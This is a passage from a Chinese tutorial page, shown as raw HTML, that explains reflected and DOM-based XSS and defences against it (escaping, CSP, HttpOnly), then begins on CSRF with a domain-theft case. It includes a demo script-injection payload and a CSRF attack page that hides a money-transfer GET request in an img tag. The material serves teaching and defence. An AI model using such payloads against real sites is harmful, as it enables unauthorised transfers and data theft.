class="gatsby-resp-image-link" href="/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-63b15.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 42.31884057971015%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsSAAALEgHS3X78AAABe0lEQVQY042OO0/CYBSG+0twspR7S1EBRZRB42r8Ef4JjSQCxUGwgm4YZ+PK4EYUkCgJiVwS2pIYCpQgUW4t9OrXTg4MPjn58p6T733PgXie73Q6nEHXoNfTRbvNDgYDhmlRNEPTDEXRFA0wNK3rZpOC8oWiG1/3bwa3gyGvL4BiHtyzgWK4w+k+OT3L3N2n0jfp9G3yiiSIeCRCxIiLWCwejRLh8DmUzxfc+Jrfv+X1+u12B4JYEIsFhs0m0wpJXmuaJkmyZiDM5qMRL8kK0Kox0c02mx3DMKvVajbDCGKG4VWfzxsIBC4TSVVVK5UKy7Lg6/fwh2NawldXHg81YSQvBKj4WnK6UBcK7DiKuUGBdmc3tLd/QJIp4FEUBUSAVdKMfy53H/NcttTLlvrsUIQmk2m1Vq/VG3/ro1p7ey/3+339Qt2oyQp41UROOMxMjx9mR3eTp4YIaf/DSNAanPTCLMqfYo5ecGMZAsHKMkRRnM/nkiQBAdqlib+2N2VhgLSxsgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 30 00" title="" data-src="/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-fee1c.png" data-srcset="/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-a67b7.png 200w,\n/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-0b187.png 400w,\n/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-fee1c.png 800w,\n/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-b1a91.png 1200w,\n/static/2021-07-15-14-30-00-d61413aaf2f70a5a3197400cb0cc5e62-63b15.png 1380w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过这个操作，我们会发现用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。</p>\n<p>另外需要注意的是，Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。</p>\n<h3 id="基于-dom-的-xss-攻击"><a href="#%E5%9F%BA%E4%BA%8E-dom-%E7%9A%84-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>基于 DOM 的 XSS 攻击</h3>\n<p>基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据</p>\n<h2 id="如何阻止-xss-攻击"><a href="#%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何阻止 XSS 攻击</h2>\n<p>我们知道存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。</p>\n<p>但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</p>\n<p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p>\n<p>接下来我们就来看看一些常用的阻止 XSS 攻击的策略</p>\n<h3 id="服务器对输入脚本进行过滤或转码"><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E8%BE%93%E5%85%A5%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4%E6%88%96%E8%BD%AC%E7%A0%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务器对输入脚本进行过滤或转码</h3>\n<p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="19354977385188010000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`code:<script>alert(\'你被 xss 攻击了\')</script>`, `19354977385188010000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>这段代码过滤后，只留下了 code</p>\n<p>这样，当用户再次请求该页面时，由于 <code class="language-text">&lt;script&gt;</code> 标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p>\n<p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="61560013615249250000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`code:&lt;script&gt;alert(&#39;你被 xss 攻击了&#39;)&lt;/script&gt;`, `61560013615249250000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被 xss 攻击了&amp;#39;)&amp;lt;/script&amp;gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>经过转码之后的内容，如 <code class="language-text">&lt;script&gt;</code> 标签被转换为 <code class="language-text">&amp;lt;script&amp;gt;</code>，因此即使这段脚本返回给页面，页面也不会执行这段脚本</p>\n<h3 id="充分利用-csp"><a href="#%E5%85%85%E5%88%86%E5%88%A9%E7%94%A8-csp" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>充分利用 CSP</h3>\n<p>虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。</p>\n<p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p>\n<ul>\n<li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li>\n<li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li>\n<li>禁止执行内联脚本和未授权的脚本；</li>\n<li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li>\n</ul>\n<p>因此，利用好 CSP 能够有效降低 XSS 攻击的概率。</p>\n<h3 id="使用-httponly-属性"><a href="#%E4%BD%BF%E7%94%A8-httponly-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 HttpOnly 属性</h3>\n<p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。</p>\n<p>通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="18021854915310810000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly`, `18021854915310810000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-33661.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 36.9098712446352%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAABlElEQVQY02M4ffp0QUFhZWVlBRiUlZWXlpaWl1eUlIDI0jIgKE9PT09JTS0uLgYqKysvLyyvKCgpKS4qYtiwYYOhoaGJiYm+np6xob66qpK2prqqsoKWhpoOEKsoAgltLXVjIwOgrI62pqGuVqCBlquhtra2BsOmTZtsbGzc3FytbB3MnYL0LD1t3cOsXYPNHAMcPcO0jB00jeytnfxsXQKcPEMMrdyNLdzaHK1irWyVjF0ZtmzZYmRkZG5mamRup24fr2wTq+OUoOucqGEXY+RXZBTeZhDSZBHVah7VZhnTbhTRquOYUG3vEGrnI2sdB9Jsa2Pj4eFhYWGhpCCnqqSopKigpKSkICXqmtKRt/l//tovWau/5a75Vrjua/7GX/aB2VWGipH6GnKKCgwbN24EarOzs9PR0VEAA0UQUJaTErOJrk9d+i51/sPk+Y8zFj3OWPgkYf5TQ/ugSj25MB01KXkFht27dwcGBsbExPr7+5ujADNLO2d7j2B7jyB790A7MLJ1D7Sxsmpzt05ztDIyMwcAG/GIahFS05YAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 33 07" title="" data-src="/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-fee1c.png" data-srcset="/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-a67b7.png 200w,\n/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-0b187.png 400w,\n/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-fee1c.png 800w,\n/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-b1a91.png 1200w,\n/static/2021-07-15-14-33-07-7b4be4c3c9feb10a88c03fa3351d8108-33661.png 1398w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从图中可以看出，NID 这个 Cookie 的 HttpOlny 属性是被勾选上的，所以 NID 的内容是无法通过 document.cookie 是来读取的。</p>\n<p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p>\n<h2 id="总结-4"><a href="#%E6%80%BB%E7%BB%93-4" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>XSS 攻击就是黑客往页面中注入恶意脚本，然后将页面的一些重要数据上传到恶意服务器。常见的三种 XSS 攻击模式是存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击。</p>\n<p>这三种攻击方式的共同点是都需要往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户数据上传到黑客的恶意服务器上。而三者的不同点在于注入的方式不一样，有通过服务器漏洞来进行注入的，还有在客户端直接注入的。</p>\n<p>针对这些 XSS 攻击，主要有三种防范策略，第一种是通过服务器对输入的内容进行过滤或者转码，第二种是充分利用好 CSP，第三种是使用 HttpOnly 来保护重要的 Cookie 信息。</p>\n<p>当然除了以上策略之外，我们还可以通过添加验证码防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以限制其输入长度，这样可以增大 XSS 攻击的难度</p>\n<h1 id="csrf-攻击：陌生链接不要随便点"><a href="#csrf-%E6%94%BB%E5%87%BB%EF%BC%9A%E9%99%8C%E7%94%9F%E9%93%BE%E6%8E%A5%E4%B8%8D%E8%A6%81%E9%9A%8F%E4%BE%BF%E7%82%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSRF 攻击：陌生链接不要随便点</h1>\n<p>XSS 的攻击方式是黑客往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户页面的数据上传到黑客的服务器上，最后黑客再利用这些数据进行一些恶意操作。XSS 攻击能够带来很大的破坏性，不过另外一种类型的攻击也不容忽视，它就是我们今天要聊的 CSRF 攻击。</p>\n<p>相信你经常能听到的一句话：“别点那个链接，小心有病毒！”点击一个链接怎么就能染上病毒了呢？</p>\n<p>我们结合一个真实的关于 CSRF 攻击的典型案例来分析下，在 2007 年的某一天，David 无意间打开了 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David 就发现他的域名被盗了。不过几经周折，David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接。</p>\n<p>那 David 的域名是怎么被盗的呢？</p>\n<p>我们结合下图来分析下 David 域名的被盗流程：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-a8e2f.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 69.75476839237056%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsSAAALEgHS3X78AAABpElEQVQoz31Sy27bMBDU/wMFeuklPeRcoL0F6KXoLxRBkdSJ5dawZCl6GLZEiu+lOiThREmQzGEhkZydmSWz2XtS0hPNMz69klIrNZ/hnBvGkXE+CaG1xgoZQ0KQVt6abCayw4niBlA3/UPbx0bhl7zf3N5uVjdFfj9xHtoxJnf/VLkFKyMpuquv3jmK5B/39ufaRhoahDX157r8dvn78pO3Yd1URfv9y6+LD6e/eaa7pvj80bEhKd81ZvVg8GGtk1KiOj6wrqrWqxSNJq6OXb25U+OQkbUhZHIZxJwSTAjRtm2e51VVKWNGPjmieQH0RM2QykY/CdrYru8ZY8fj8RQxjgOqNXZJTkONZGPg0mNmRBivMQa167qmacZxTDNfCgRyHHCG69FKT3U1rFe8LJAT5Pk53iMLKRFScC6mCVJpA8q73Q7mcYCioyU5CWTYWHbFIfDB2W63ZVnu9/thiJnjGR/xpAzy0ifI+vxgXnSs67ooCtjp+z71CraXyo9G/PnyEvlwOODawK8ikDKQ5zfgn+P17ptk6KfkbdvgtbwY9SP+Awe9KmLrcSRIAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 34 17" title="" data-src="/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-fee1c.png" data-srcset="/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-a67b7.png 200w,\n/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-0b187.png 400w,\n/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-fee1c.png 800w,\n/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-b1a91.png 1200w,\n/static/2021-07-15-14-34-17-e2923a24a48eb1efd62f558f7be0e422-a8e2f.png 1468w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<ul>\n<li>首先 David 发起登录 Gmail 邮箱请求，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。</li>\n<li>接着黑客通过各种手段引诱 David 去打开他的链接，比如 hacker.com，然后在 hacker.com 页面中，黑客编写好了一个邮件过滤器，并通过 Gmail 提供的 HTTP 设置接口设置好了新的邮件过滤功能，该过滤器会将 David 所有的邮件都转发到黑客的邮箱中。</li>\n<li>最后的事情就很简单了，因为有了 David 的邮件内容，所以黑客就可以去域名服务商那边重置 David 域名账户的密码，重置好密码之后，就可以将其转出到黑客的账户了。</li>\n</ul>\n<p>以上就是 David 的域名被盗的完整过程，其中前两步就是我们今天要聊的 CSRF 攻击。David 在要回了他的域名之后，也将整个攻击过程分享到他的站点上了</p>\n<h2 id="什么是-csrf-攻击"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-csrf-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 CSRF 攻击</h2>\n<p>CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事</p>\n<p>通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。</p>\n<p>下面我们以极客时间官网为例子，来分析这三种攻击方式都是怎么实施的。这里假设极客时间具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="2093393091155659800"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`# 同时支持 POST 和 GET\n# 接口\nhttps://time.geekbang.org/sendcoin\n# 参数\n## 目标用户\nuser\n## 目标金额\nnumber`, `2093393091155659800`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text"># 同时支持 POST 和 GET\n# 接口\nhttps://time.geekbang.org/sendcoin\n# 参数\n## 目标用户\nuser\n## 目标金额\nnumber</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>有了上面的转账接口，我们就可以来模拟 CSRF 攻击了。</p>\n<h3 id="自动发起-get-请求"><a href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-get-%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自动发起 Get 请求</h3>\n<p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="24538903495924800000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <h1>黑客的站点：CSRF 攻击演示</h1>\n    <img data-src=&quot;https://time.geekbang.org/sendcoin?user=hacker&amp;number=100&quot; />\n  </body>\n</html>`, `24538903495924800000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>黑客的站点：CSRF 攻击演示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin?user=hacker&amp;number=100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 